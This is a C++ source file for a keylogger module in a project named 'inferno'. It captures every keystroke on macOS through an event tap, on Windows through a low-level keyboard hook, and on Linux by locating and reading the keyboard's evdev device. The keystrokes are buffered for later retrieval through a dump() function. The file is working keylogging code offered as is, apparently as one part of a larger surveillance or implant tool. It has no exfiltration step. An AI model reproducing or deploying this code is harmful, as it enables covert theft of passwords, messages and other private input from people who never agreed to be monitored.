#include "../include/KeyLogger.hpp"
#include <iostream>
#include <future>

#ifdef __APPLE__
#include <Carbon/Carbon.h>
#elif defined(_WIN32)
// Windows headers included via KeyLogger.hpp
#elif defined(__linux__)
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <linux/input-event-codes.h>
#include <dirent.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <climits>
#include <cerrno>
#include <cstring>
#endif

namespace inferno {

#ifdef _WIN32
KeyLogger* KeyLogger::s_instance = nullptr;
#endif

KeyLogger::KeyLogger() : m_running(false) {
#ifdef __APPLE__
    m_event_tap = nullptr;
    m_runloop_source = nullptr;
    m_runloop = nullptr;
#elif defined(_WIN32)
    m_keyboard_hook = nullptr;
    m_hook_thread_id = 0;
#elif defined(__linux__)
    m_input_fd = -1;
    m_shift_pressed = false;
    m_caps_active = false;
    m_ctrl_pressed = false;
    m_alt_pressed = false;
#endif
}

KeyLogger::~KeyLogger() {
    stop();
}

bool KeyLogger::isRunning() const {
    return m_running;
}

std::string KeyLogger::dump() {
    std::lock_guard<std::mutex> lock(m_mutex);
    std::string current_buffer = std::move(m_buffer);
    m_buffer.clear();
    return current_buffer;
}

#ifdef INFERNO_TESTING
void KeyLogger::injectKeystroke(char c) {
    std::lock_guard<std::mutex> lock(m_mutex);
    if (m_buffer.size() < MAX_BUFFER_SIZE) {
        m_buffer.push_back(c);
    }
}
#endif

#ifdef __APPLE__

void KeyLogger::appendKeystroke(const std::string& stroke) {
    std::lock_guard<std::mutex> lock(m_mutex);
    if (m_buffer.size() + stroke.size() <= MAX_BUFFER_SIZE) {
        m_buffer += stroke;
    }
}

CGEventRef KeyLogger::eventCallback(CGEventTapProxy proxy, CGEventType type,
                                    CGEventRef event, void* refcon) {
    (void)proxy;
    if (type != kCGEventKeyDown) {
        return event;
    }

    KeyLogger* logger = static_cast<KeyLogger*>(refcon);
    CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    
    // Convert keycode to string (simplified for demonstration, proper UCKeyTranslate could be used)
    std::string key_str;
    
    // Quick map for common keys
    if (keycode == 36) key_str = "[ENTER]";
    else if (keycode == 49) key_str = " ";
    else if (keycode == 51) key_str = "[BACKSPACE]";
    else if (keycode == 48) key_str = "[TAB]";
    else {
        // We use CGEventKeyboardGetUnicodeString
        UniChar chars[4];
        UniCharCount realLength;
        CGEventKeyboardGetUnicodeString(event, 4, &realLength, chars);
        if (realLength > 0) {
            // Very simple ASCII conversion for standard keys
            key_str = std::string(1, (char)chars[0]);
        } else {
            key_str = "[KEY:" + std::to_string(keycode) + "]";
        }
    }

    logger->appendKeystroke(key_str);
    return event;
}

void KeyLogger::start() {
    std::lock_guard<std::mutex> lock(m_mutex);
    if (m_running) return;

#ifdef INFERNO_TESTING
    std::cerr << "[KeyLogger] INFERNO_TESTING is active. Bypassing tap creation completely.\n";
    m_running = true;
#else
    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
    
    // Note: kCGHIDEventTap requires root or Accessibility permissions.
    // kCGSessionEventTap requires Accessibility permissions.
    m_event_tap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap,
                                   kCGEventTapOptionDefault, eventMask,
                                   eventCallback, this);

    if (!m_event_tap) {
        std::cerr << "[KeyLogger] Failed to create CGEventTap. Needs Accessibility permissions.\n";
        return;
    }

    m_runloop_source = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, m_event_tap, 0);
    m_running = true;

    auto shared_promise = std::make_shared<std::promise<void>>();
    auto runloop_future = shared_promise->get_future();

    // Platform Exception: Start the dedicated CFRunLoop thread
    m_runloop_thread = std::thread([this, shared_promise]() {
        CFRunLoopRef runloop = CFRunLoopGetCurrent();
        m_runloop = (CFRunLoopRef)CFRetain(runloop);

        CFRunLoopObserverContext context = {0, shared_promise.get(), nullptr, nullptr, nullptr};
        CFRunLoopObserverRef observer = CFRunLoopObserverCreate(
            kCFAllocatorDefault,
            kCFRunLoopEntry,
            false, // repeats
            0,     // order
            [](CFRunLoopObserverRef observer, CFRunLoopActivity activity, void *info) {
                (void)observer;
                if (activity == kCFRunLoopEntry) {
                    auto* promise = static_cast<std::promise<void>*>(info);
                    promise->set_value();
                }
            },
            &context
        );

        if (observer) {
            CFRunLoopAddObserver(m_runloop, observer, kCFRunLoopCommonModes);
        } else {
            // Safe fallback to prevent startup deadlock in case of allocation failure
            shared_promise->set_value();
        }

        CFRunLoopAddSource(m_runloop, m_runloop_source, kCFRunLoopCommonModes);
        CGEventTapEnable(m_event_tap, true);
        CFRunLoopRun(); // Blocks until CFRunLoopStop is called

        if (observer) {
            CFRunLoopRemoveObserver(m_runloop, observer, kCFRunLoopCommonModes);
            CFRelease(observer);
        }
    });

    // Ensure the runloop is entered and actively running before start() returns
    runloop_future.wait();
#endif
}

void KeyLogger::stop() {
    {
        std::lock_guard<std::mutex> lock(m_mutex);
        if (!m_running) return;
        m_running = false;
    }

    // 1. Disable the tap so it stops receiving events
    if (m_event_tap) {
        CGEventTapEnable(m_event_tap, false);
    }
    
    // 2. Stop the RunLoop gracefully
    if (m_runloop) {
        CFRunLoopStop(m_runloop);
    }

    // 3. Wait for the background thread to fully exit before invalidating
    if (m_runloop_thread.joinable()) {
        m_runloop_thread.join();
    }

    // 4. Clean up CoreFoundation resources sequentially and safely
    std::lock_guard<std::mutex> lock(m_mutex);
    
    if (m_event_tap) {
        CFMachPortInvalidate(m_event_tap);
    }

    if (m_runloop_source) {
        CFRelease(m_runloop_source);
        m_runloop_source = nullptr;
    }
    
    if (m_event_tap) {
        CFRelease(m_event_tap);
        m_event_tap = nullptr;
    }
    
    if (m_runloop) {
        CFRelease(m_runloop);
        m_runloop = nullptr;
    }
}

#elif defined(_WIN32)

void KeyLogger::appendKeystroke(const std::string& stroke) {
    std::lock_guard<std::mutex> lock(m_mutex);
    if (m_buffer.size() + stroke.size() <= MAX_BUFFER_SIZE) {
        m_buffer += stroke;
    }
}

LRESULT CALLBACK KeyLogger::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbd = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        if (s_instance) {
            std::string key_str;
            DWORD vk = kbd->vkCode;
            
            if (vk == VK_RETURN) key_str = "[ENTER]";
            else if (vk == VK_SPACE) key_str = " ";
            else if (vk == VK_BACK) key_str = "[BACKSPACE]";
            else if (vk == VK_TAB) key_str = "[TAB]";
            else {
                BYTE keyboard_state[256];
                GetKeyboardState(keyboard_state);
                
                HWND hwnd = GetForegroundWindow();
                DWORD thread_id = GetWindowThreadProcessId(hwnd, NULL);
                HKL layout = GetKeyboardLayout(thread_id);
                
                WCHAR unicode_chars[5] = {0};
                keyboard_state[VK_SHIFT] = GetKeyState(VK_SHIFT) & 0x80;
                keyboard_state[VK_LSHIFT] = GetKeyState(VK_LSHIFT) & 0x80;
                keyboard_state[VK_RSHIFT] = GetKeyState(VK_RSHIFT) & 0x80;
                keyboard_state[VK_CAPITAL] = GetKeyState(VK_CAPITAL) & 0x01;
                keyboard_state[VK_CONTROL] = GetKeyState(VK_CONTROL) & 0x80;
                keyboard_state[VK_MENU] = GetKeyState(VK_MENU) & 0x80;

                int ret = ToUnicodeEx(vk, kbd->scanCode, keyboard_state, unicode_chars, 4, 0, layout);
                if (ret > 0) {
                    int size_needed = WideCharToMultiByte(CP_UTF8, 0, unicode_chars, ret, NULL, 0, NULL, NULL);
                    std::string utf8_str(size_needed, 0);
                    WideCharToMultiByte(CP_UTF8, 0, unicode_chars, ret, &utf8_str[0], size_needed, NULL, NULL);
                    key_str = utf8_str;
                }
            }
            if (!key_str.empty()) {
                s_instance->appendKeystroke(key_str);
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void KeyLogger::start() {
    std::lock_guard<std::mutex> lock(m_mutex);
    if (m_running) return;

#ifdef INFERNO_TESTING
    std::cerr << "[KeyLogger] INFERNO_TESTING is active. Bypassing Windows hook creation.\n";
    m_running = true;
#else
    s_instance = this;
    m_running = true;

    auto shared_promise = std::make_shared<std::promise<void>>();
    auto hook_future = shared_promise->get_future();

    m_hook_thread = std::thread([this, shared_promise]() {
        m_hook_thread_id = GetCurrentThreadId();
        m_keyboard_hook = SetWindowsHookExA(WH_KEYBOARD_LL, keyboardHookProc, GetModuleHandle(NULL), 0);
        if (!m_keyboard_hook) {
            std::cerr << "[KeyLogger] Failed to install Windows WH_KEYBOARD_LL hook. Error: " << GetLastError() << "\n";
            m_running = false;
            shared_promise->set_value();
            return;
        }

        shared_promise->set_value();

        MSG msg;
        while (m_running && GetMessage(&msg, NULL, 0, 0) > 0) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    });

    hook_future.wait();
#endif
}

void KeyLogger::stop() {
    {
        std::lock_guard<std::mutex> lock(m_mutex);
        if (!m_running) return;
        m_running = false;
    }

    if (m_keyboard_hook) {
        UnhookWindowsHookEx(m_keyboard_hook);
        m_keyboard_hook = NULL;
    }

    if (m_hook_thread_id != 0) {
        PostThreadMessageA(m_hook_thread_id, WM_QUIT, 0, 0);
        m_hook_thread_id = 0;
    }

    if (m_hook_thread.joinable()) {
        m_hook_thread.join();
    }

    s_instance = nullptr;
}

#elif defined(__linux__)

// ── Device Discovery ──────────────────────────────────────────

std::string KeyLogger::findKeyboardDevice() {
    // Strategy 1: /dev/input/by-path/ — udev-managed symlinks
    // Names like "pci-0000:00:14.0-usb-0:5:1.0-event-kbd" or
    // "platform-i8042-serio-0-event-kbd" (PS/2)
    const char* by_path = "/dev/input/by-path/";
    DIR* dir = opendir(by_path);
    if (dir) {
        struct dirent* entry;
        while ((entry = readdir(dir)) != nullptr) {
            std::string name(entry->d_name);
            if (name.find("-kbd") != std::string::npos ||
                name.find("-keyboard") != std::string::npos) {
                std::string full_path = std::string(by_path) + name;
                char resolved[PATH_MAX];
                if (realpath(full_path.c_str(), resolved)) {
                    closedir(dir);
                    return std::string(resolved);
                }
            }
        }
        closedir(dir);
    }

    // Strategy 2: iterate /dev/input/event* and probe via ioctl
    // This covers systems without udev/by-path (containers, embedded, etc.)
    for (int i = 0; i < 64; ++i) {
        std::string path = "/dev/input/event" + std::to_string(i);
        int fd = ::open(path.c_str(), O_RDONLY | O_NONBLOCK);
        if (fd < 0) continue;

        // Check that the device supports keys (EV_KEY) and has at least
        // typical keyboard keys (ENTER + a letter key)
        unsigned long ev_bits[2] = {0};
        unsigned long key_bits[KEY_CNT / (sizeof(unsigned long) * 8) + 1] = {0};

        int rc = ioctl(fd, EVIOCGBIT(0, sizeof(ev_bits)), ev_bits);
        if (rc >= 0 && (ev_bits[0] & (1UL << EV_KEY))) {
            rc = ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(key_bits)), key_bits);
            if (rc >= 0) {
                auto testBit = [&](int k) -> bool {
                    return (key_bits[k / (sizeof(unsigned long) * 8)] &
                            (1UL << (k % (sizeof(unsigned long) * 8)))) != 0;
                };
                // Heuristic: a keyboard has ENTER + at least one letter
                if (testBit(KEY_ENTER) && (testBit(KEY_A) || testBit(KEY_Q))) {
                    ::close(fd);
                    return path;
                }
            }
        }
        ::close(fd);
    }

    return "";
}

// ── Keycode Translation ───────────────────────────────────────

void KeyLogger::evdevLoop() {
    struct pollfd pfd;
    pfd.fd = m_input_fd;
    pfd.events = POLLIN;

    while (m_running) {
        int ret = poll(&pfd, 1, 100);
        if (ret < 0) {
            if (errno == EINTR) continue;
            break;
        }
        if (ret == 0) continue;

        if (!(pfd.revents & POLLIN)) continue;

        struct input_event ev;
        ssize_t n = read(m_input_fd, &ev, sizeof(ev));
        if (n < (ssize_t)sizeof(ev)) {
            if (n < 0 && errno != EAGAIN) break;
            continue;
        }

        // Only process EV_KEY events
        if (ev.type != EV_KEY) continue;

        uint16_t code = ev.code;
        uint32_t val  = ev.value; // 0=release, 1=press, 2=repeat

        // ── Modifier state tracking ──
        if (val == 1 || val == 0) {    // press or release
            bool pressed = (val == 1);
            switch (code) {
                case KEY_LEFTSHIFT:  case KEY_RIGHTSHIFT:
                    m_shift_pressed = pressed; continue;
                case KEY_CAPSLOCK:
                    if (pressed) m_caps_active = !m_caps_active;
                    continue;
                case KEY_LEFTCTRL:   case KEY_RIGHTCTRL:
                    m_ctrl_pressed = pressed; continue;
                case KEY_LEFTALT:    case KEY_RIGHTALT:
                    m_alt_pressed = pressed; continue;
            }
        }

        // Skip autorepeat (value == 2) and releases
        if (val != 1) continue;

        // Skip pure modifier-only presses (already handled above, but
        // the switch didn't `continue` for non-modifier keys — add guard)
        switch (code) {
            case KEY_LEFTSHIFT:  case KEY_RIGHTSHIFT:
            case KEY_CAPSLOCK:
            case KEY_LEFTCTRL:   case KEY_RIGHTCTRL:
            case KEY_LEFTALT:    case KEY_RIGHTALT:
                continue;
        }

        // Skip ctrl+alt combos (typically shortcuts, not typed text)
        if (m_ctrl_pressed || m_alt_pressed) continue;

        bool shifted = m_shift_pressed ^ m_caps_active;
        std::string key_str;

        // ── Letter keys ──
        if (code >= KEY_A && code <= KEY_Z) {
            char c = 'a' + (code - KEY_A);
            if (shifted) c -= 32;   // uppercase via ASCII
            key_str = std::string(1, c);
        }
        // ── Number row ──
        else if (code >= KEY_1 && code <= KEY_0) {
            static const char digits[] = "1234567890";
            static const char* symbols[] = {
                "!", "@", "#", "$", "%", "^", "&", "*", "(", ")"
            };
            int idx = code - KEY_1;
            if (idx >= 0 && idx <= 9) {
                key_str = shifted ? symbols[idx] : std::string(1, digits[idx]);
            }
        }
        else switch (code) {
            case KEY_ENTER:     key_str = "[ENTER]";    break;
            case KEY_BACKSPACE: key_str = "[BACKSPACE]"; break;
            case KEY_TAB:       key_str = "[TAB]";      break;
            case KEY_SPACE:     key_str = " ";          break;
            case KEY_MINUS:     key_str = shifted ? "_" : "-";    break;
            case KEY_EQUAL:     key_str = shifted ? "+" : "=";    break;
            case KEY_LEFTBRACE:  key_str = shifted ? "{" : "[";   break;
            case KEY_RIGHTBRACE: key_str = shifted ? "}" : "]";   break;
            case KEY_SEMICOLON:  key_str = shifted ? ":" : ";";   break;
            case KEY_APOSTROPHE: key_str = shifted ? "\"" : "'";  break;
            case KEY_GRAVE:     key_str = shifted ? "~" : "`";    break;
            case KEY_BACKSLASH: key_str = shifted ? "|" : "\\";   break;
            case KEY_COMMA:     key_str = shifted ? "<" : ",";    break;
            case KEY_DOT:       key_str = shifted ? ">" : ".";    break;
            case KEY_SLASH:     key_str = shifted ? "?" : "/";    break;
            case KEY_KPASTERISK: key_str = "*";  break;
            case KEY_KPMINUS:    key_str = "-";  break;
            case KEY_KPPLUS:     key_str = "+";  break;
            case KEY_KPDOT:      key_str = ".";  break;
            case KEY_KPSLASH:    key_str = "/";  break;
            case KEY_KPCOMMA:    key_str = ",";  break;
            case KEY_UP:        key_str = "[UP]";     break;
            case KEY_DOWN:      key_str = "[DOWN]";   break;
            case KEY_LEFT:      key_str = "[LEFT]";   break;
            case KEY_RIGHT:     key_str = "[RIGHT]";  break;
            case KEY_ESC:       key_str = "[ESC]";    break;
            case KEY_DELETE:    key_str = "[DEL]";    break;
            case KEY_HOME:      key_str = "[HOME]";   break;
            case KEY_END:       key_str = "[END]";    break;
            case KEY_PAGEUP:    key_str = "[PAGEUP]"; break;
            case KEY_PAGEDOWN:  key_str = "[PAGEDOWN]"; break;
            case KEY_INSERT:    key_str = "[INSERT]"; break;
            case KEY_SYSRQ:     key_str = "[PRTSC]";  break;
            case KEY_PAUSE:     key_str = "[PAUSE]";  break;
            case KEY_MENU:      key_str = "[MENU]";   break;

            default:
                if (code >= KEY_F1 && code <= KEY_F12) {
                    key_str = "[F" + std::to_string(code - KEY_F1 + 1) + "]";
                } else if (code >= KEY_KP0 && code <= KEY_KP9) {
                    key_str = std::string(1, '0' + (code - KEY_KP0));
                } else {
                    key_str = "[KEY:" + std::to_string(code) + "]";
                }
                break;
        }

        if (!key_str.empty()) {
            appendKeystroke(key_str);
        }
    }
}

void KeyLogger::appendKeystroke(const std::string& stroke) {
    std::lock_guard<std::mutex> lock(m_mutex);
    if (m_buffer.size() + stroke.size() <= MAX_BUFFER_SIZE) {
        m_buffer += stroke;
    }
}

void KeyLogger::start() {
    std::lock_guard<std::mutex> lock(m_mutex);
    if (m_running) return;

#ifdef INFERNO_TESTING
    std::cerr << "[KeyLogger] INFERNO_TESTING active. Bypassing evdev device open.\n";
    m_running = true;
#else
    m_device_path = findKeyboardDevice();
    if (m_device_path.empty()) {
        std::cerr << "[KeyLogger] No keyboard device found.\n";
        return;
    }

    m_input_fd = ::open(m_device_path.c_str(), O_RDONLY | O_NONBLOCK);
    if (m_input_fd < 0) {
        std::cerr << "[KeyLogger] Failed to open " << m_device_path << ": "
                  << std::strerror(errno) << "\n";
        return;
    }

    m_running = true;
    m_evdev_thread = std::thread(&KeyLogger::evdevLoop, this);
#endif
}

void KeyLogger::stop() {
    {
        std::lock_guard<std::mutex> lock(m_mutex);
        if (!m_running) return;
        m_running = false;
    }

    if (m_evdev_thread.joinable()) {
        m_evdev_thread.join();
    }

    std::lock_guard<std::mutex> lock(m_mutex);

    if (m_input_fd != -1) {
        ::close(m_input_fd);
        m_input_fd = -1;
    }
}

#endif

} // namespace inferno
